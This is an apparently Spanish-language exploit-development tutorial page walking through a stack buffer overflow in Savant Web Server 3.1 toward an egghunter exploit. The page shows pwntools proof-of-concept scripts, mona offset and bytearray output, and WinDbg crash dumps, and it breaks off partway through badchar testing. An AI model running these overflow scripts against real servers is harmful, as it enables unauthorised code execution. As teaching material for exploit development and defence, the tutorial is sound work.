<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>6.0 - EggHunters</title>

  <meta name="description" content="Explotación de Buffer Overflow usando EggHunters">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="6.0 - EggHunters">
  <meta name="twitter:description" content="Explotación de Buffer Overflow usando EggHunters">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/exploitdevelopment/user-mode/egghunters/image.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="6.0 - EggHunters">
  <meta property="og:description" content="Explotación de Buffer Overflow usando EggHunters">
  <meta property="og:image" content="/exploitdevelopment/user-mode/egghunters/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploitdevelopment/user-mode/egghunters/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="6.0 - EggHunters" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploitdevelopment/user-mode" title="xchg2pwn" class="blog-button">User Mode</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#crashing">6.1 - Crashing Application</a></li>
        <li><a href="#offset">6.2 - Find Offset</a></li>
        <li><a href="#badchars">6.3 - Find Badchars</a></li>
        <li><a href="#opcode">6.4 - Find Opcode</a></li>
        <li><a href="#egg">6.5 - EggHunter</a></li>
        <li><a href="#win10">6.6 - EggHunter win10</a></li>
        <li><a href="#wow64">6.7 - EggHunter wow64</a></li>
        <li><a href="#seh">6.8 - EggHunter SEH</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploitdevelopment/user-mode/egghunters/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">6.0 - EggHunters</h2><br>
  </header>

<section class="post" id="index">
    <br><p class="plain-text">En las explotaciones anteriores teniamos espacio suficiente para guardar el <code class="language-plaintext highlighter-rouge">shellcode</code> conociendo su ubicación, sin embargo hay aplicaciones con un espacio muy limitado que generalmente no es suficiente para un shellcode, aqui entra el <code class="language-plaintext highlighter-rouge">egghunter</code> que resumiendo su uso es un codigo mucho mas pequeño que busca el shellcode que esta en algun lugar de la memoria desconocido y lo ejecuta</p>
</section>

<section class="post" id="crashing">
<br><h3 class="post-title">6.1 - Crashing Application</h3><br>

<p class="plain-text">La aplicación que usaremos para ver esta técnica será nuevamente un programa real con un poco mas de complejidad de lo normal con la finalidad de aprender a adaptarnos a algunas restricciones, esta será <a href="https://github.com/xchg2pwn/ExploitDevelopment/blob/main/SavantWebServer_3.1/Savant.exe">Savant Web Server 3.1</a></p>
<a href="/exploitdevelopment/user-mode/egghunters/0.png" target="_blank"><div><p><img src="/exploitdevelopment/user-mode/egghunters/0.png"></p></div></a>

<p class="plain-text">Nuevamente evitaremos la detección de la vulnerabilidad para ahorrar tiempo y usaremos un exploit de <code class="language-plaintext highlighter-rouge">exploitdb</code> para crear nuestro <code class="language-plaintext highlighter-rouge">poc</code>, una pregunta podria ser ¿porque el tamaño especifico de solo <code class="language-plaintext highlighter-rouge">260</code> bytes?, lo veremos un poco mas adelante</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

payload </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">260</span><span class="p">

content </span><span class="o">= </span><span class="no">b</span><span class="s">"GET /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"  </span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el poc podemos ver que corrompemos el programa y ahora el registro <code class="language-plaintext highlighter-rouge">eip</code> apunta a la dirección <code class="language-plaintext highlighter-rouge">0x41414141</code> ya que se ha desbordado algun buffer asignado</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to Windows on port 80: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to Windows port 80</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(100c.1530): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=00792ca0 ecx=a7da135b edx=00000000 esi=00792ca0 edi=0041703c  
eip=41414141 esp=042cea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202  
41414141 ??              ???</span>
</code></pre></div></div><br>

</section>

<section class="post" id="offset">
<br><h3 class="post-title">6.1 - Find Offset</h3><br>

<p class="plain-text">Nuestra idea es tener control sobre el registro <code class="language-plaintext highlighter-rouge">eip</code> pero para ello necesitamos cuantos bytes se necesitan antes de sobrescribirlo, para ello podemos usar <code class="language-plaintext highlighter-rouge">mona</code> y crear un patron de caracteres que nos ayudaran a encontrar esa cantidad de bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:008> </span><span class="p">!py mona pattern_create 260
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py pattern_create 260
Creating cyclic pattern of 260 bytes
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai  
[+] Preparing output file 'pattern.txt'
    - (Re)setting logfile C:\mona\pattern.txt
Note: don't copy this pattern from the log window, it might be truncated !
It's better to open C:\mona\pattern.txt and copy the pattern from the file</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora cambiamos las <code class="language-plaintext highlighter-rouge">260 A's</code> del payload por este patrón y enviamos el exploit</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

payload </span><span class="o">= </span><span class="no">b</span><span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai"  </span><span class="p">

content </span><span class="o">= </span><span class="no">b</span><span class="s">"GET /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Una vez enviado el exploit el programa corrompe sin embargo ahora no apunta a <code class="language-plaintext highlighter-rouge">0x41414141</code> sino a <code class="language-plaintext highlighter-rouge">0x69413469</code> que es parte del patron de caracteres de mona</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1bf4.1858): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=00642ca0 ecx=f62ed552 edx=00000000 esi=00642ca0 edi=0041703c  
eip=69413469 esp=0429ea1c ebp=41336941 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202  
69413469 ??              ???</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que sabemos esto podemos usar <code class="language-plaintext highlighter-rouge">pattern_offset</code> para calcular la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> necesarios antes de sobrescribir el registro <code class="language-plaintext highlighter-rouge">eip</code>, que son solo <code class="language-plaintext highlighter-rouge">253</code> bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona pattern_offset eip
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py pattern_offset eip
Looking for i4Ai in pattern of 500000 bytes
 - Pattern i4Ai (0x69413469) found in cyclic pattern at position 253  
Looking for i4Ai in pattern of 500000 bytes
Looking for iA4i in pattern of 500000 bytes
 - Pattern iA4i not found in cyclic pattern (uppercase)  
Looking for i4Ai in pattern of 500000 bytes
Looking for iA4i in pattern of 500000 bytes
 - Pattern iA4i not found in cyclic pattern (lowercase)</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que sabemos el offset podemos enviar <code class="language-plaintext highlighter-rouge">253 A's</code> hasta antes de sobrescribir el eip que lo haremos con <code class="language-plaintext highlighter-rouge">4 B's</code> y enviaremos <code class="language-plaintext highlighter-rouge">4 C's</code> adicionales que se deberian guardar justo donde inicia el <code class="language-plaintext highlighter-rouge">stack</code> por lo que el registro esp deberia apuntar a esas <code class="language-plaintext highlighter-rouge">C's</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">= </span><span class="p">253
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

ret </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
stack </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">4</span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret </span><span class="o">+ </span><span class="p">stack

content </span><span class="o">= </span><span class="no">b</span><span class="s">"GET /" </span><span class="o">+ </span><span class="p">payload</span><span class="o"> + </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">  

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Hay un problema, cuando enviamos un payload mayor a <code class="language-plaintext highlighter-rouge">260</code> corrompemos la aplicación pero el error es diferente por lo que no tenemos control sobre el <code class="language-plaintext highlighter-rouge">eip</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(114c.9b8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=43434343 ebx=02462ca0 ecx=00600000 edx=00600000 esi=02462ca0 edi=0041703c
eip=0040c05f esp=042fe6a8 ebp=042fea14 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
Savant+0xc05f:
0040c05f 8b08            mov     ecx,dword ptr [eax]  ds:002b:43434343=????????  </span>
</code></pre></div></div><br>

<p class="plain-text">Para evitar este problema quitaremos los 4 bytes que se almacenarian en el stack y veremos como se comporta el programa, por ahora nos quedamos que el espacio que tenemos para guardar instrucciones es de apenas <code class="language-plaintext highlighter-rouge">3</code> bytes que no nos sirven</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

ret </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret

content </span><span class="o">= </span><span class="no">b</span><span class="s">"GET /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">  

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora el eip se sobrescribe con <code class="language-plaintext highlighter-rouge">0x42424242</code>, al revisar los bytes del stack encontramos 2 cosas interesantes, la primera es que el primer byte del dword es un <code class="language-plaintext highlighter-rouge">0x00</code> lo que quiere decir que despues de escribir nuestra cadena escribe un null byte</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1f74.bf8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=01fe2ca0 ecx=308ab9d2 edx=00000000 esi=01fe2ca0 edi=0041703c  
eip=42424242 esp=0429ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202  
42424242 ??              ???

</span><span class="ro">0:000> </span><span class="p">dd esp L4
0429ea1c  0429fe00 0429ea74 0041703c 01fe2ca0</span>
</code></pre></div></div><br>

<p class="plain-text">Lo segundo es que parecen punteros, al escribir el null byte en el primer <code class="language-plaintext highlighter-rouge">dword</code> este sera invalido pero al revisar que hay en el segundo podemos ver que este apunta al <code class="language-plaintext highlighter-rouge">inicio</code> de nuestro input, tenemos una forma de saber donde se encuentra el input</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db poi(esp + 4)
0429ea74  47 45 54 00 00 00 00 00-00 00 00 00 00 00 00 00  GET.............  
0429ea84  00 00 00 00 00 00 00 00-2f 41 41 41 41 41 41 41  ......../AAAAAAA  
0429ea94  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0429eaa4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0429eab4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0429eac4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0429ead4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0429eae4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  </span>
</code></pre></div></div><br>

</section>

<section class="post" id="badchars">
<br><h3 class="post-title">6.3 - Find Badchars</h3><br>

<p class="plain-text">Ya que sabemos como podemos encontrar nuestro payload intentaremos detectar los <code class="language-plaintext highlighter-rouge">badchars</code>, igual a posts anteriores podemos iniciar creando un <code class="language-plaintext highlighter-rouge">bytearray</code> con mona</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> !py mona bytearray
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py bytearray
Generating table, excluding 0 bad chars...
Dumping table to file
[+] Preparing output file 'bytearray.txt'
    - (Re)setting logfile C:\mona\bytearray.txt
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"  
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"  
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"  
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"  
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"  
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"  
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"  
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"  

Done, wrote 256 bytes to file C:\mona\bytearray.txt
Binary output saved in C:\mona\bytearray.bin</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que tenemos la limitación de espacio despues de sobrescribir la dirección de retorno enviaremos los badchars al inicio del input después del metodo indicado</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

badchars  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span><span class="p">

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(badchars))

ret </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">

payload </span><span class="o">= </span><span class="p">badchars </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret

content </span><span class="o">= </span><span class="no">b</span><span class="s">"GET /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Hay un problema, al enviar el exploit esta vez el programa ni siquiera corrompe, ¿porque? es probable que alguno de los <code class="language-plaintext highlighter-rouge">badchars</code> delimiten la petición y corten la cadena por lo que ni siquiera logramos sobrescribir la dirección de retorno</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
Debuggee is running...</span>
</code></pre></div></div><br>

<p class="plain-text">¿Que podemos hacer?, en realidad hay 2 opciones para identificar los badchars:</code>
<p class="plain-text">• Comentar lineas de badchars para identificar en que parte de estos el programa corrompe para descartarlos linea por linea.</p>
<p class="plain-text">• Eliminar los badchars que de acuerdo al contexto podrian darnos problemas como el <code class="language-plaintext highlighter-rouge">0x00</code>, <code class="language-plaintext highlighter-rouge">0x0a</code> y <code class="language-plaintext highlighter-rouge">0x0d</code> que equivalen a <code class="language-plaintext highlighter-rouge">\0</code>, <code class="language-plaintext highlighter-rouge">\n</code> y <code class="language-plaintext highlighter-rouge">\r</code> que como vimos en <a href="/exploitdevelopment/stack/#badchars">posts</a> pasados podrian tomar otra función dentro de una petición <code class="language-plaintext highlighter-rouge">http</code> y corromperlo.</p>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> !py mona bytearray -cpb '\x00\x0a\x0d'
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py bytearray -cpb '\x00\x0a\x0d'
Generating table, excluding 3 bad chars...
Dumping table to file
[+] Preparing output file 'bytearray.txt'
    - (Re)setting logfile C:\mona\bytearray.txt
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22"  
"\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"  
"\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"  
"\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"  
"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2"  
"\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"  
"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2"  
"\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span>
</code></pre></div></div><br>

<p class="plain-text">Una vez quitamos los <code class="language-plaintext highlighter-rouge">3</code> bytes que podrian darnos problemas modificamos el exploit</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">badchars  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s">"  </span><span class="p">
